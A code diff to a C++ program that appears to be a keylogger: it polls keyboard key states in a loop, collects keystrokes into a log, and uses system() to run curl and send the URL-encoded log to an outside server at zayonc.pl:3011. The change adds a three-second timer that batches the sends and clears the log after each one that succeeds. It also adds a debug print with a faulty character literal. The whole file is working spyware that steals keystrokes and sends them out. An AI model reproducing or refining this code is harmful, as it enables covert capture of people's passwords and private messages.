@@ -5,6 +5,7 @@
 #include <cctype>
 #include <iomanip>
 #include <sstream>
+#include <ctime>
 
 using namespace std;
 
@@ -94,13 +95,11 @@ string url_encode(const string& value) {
 	for (string::const_iterator i = value.begin(), n = value.end(); i != n; ++i) {
 		string::value_type c = (*i);
 
-		// Keep alphanumeric and other accepted characters intact
 		if (isalnum(c) || c == '-' || c == '_' || c == '.' || c == '~') {
 			escaped << c;
 			continue;
 		}
 
-		// Any other characters are percent-encoded
 		escaped << uppercase;
 		escaped << '%' << setw(2) << int((unsigned char)c);
 		escaped << nouppercase;
@@ -117,6 +116,10 @@ int main()
 
 	string log = "";
 
+	time_t lastUpdate;
+	time(&lastUpdate);
+
+
 	while (true) {
 		Sleep(10);
 		for (unsigned char key = 8; key <= 165; key++)
@@ -129,9 +132,19 @@ int main()
 			}
 		}
 
-		string req = "curl http://zayonc.pl:3011/log?log=" + url_encode(log);
+		cout << time(NULL) << ", " << lastUpdate << ", " << time(NULL) - lastUpdate << "\n";
 
-		system(req.c_str());
+		if (time(NULL) - lastUpdate >= 3) {
+			string req = "curl http://zayonc.pl:3011/log?log=" + url_encode(log);
+
+			cout << 'send';
+
+			if (!system(req.c_str())) {
+				time(&lastUpdate);
+				log = "";
+			}
+		}
+
 	}
 
 	return 0;
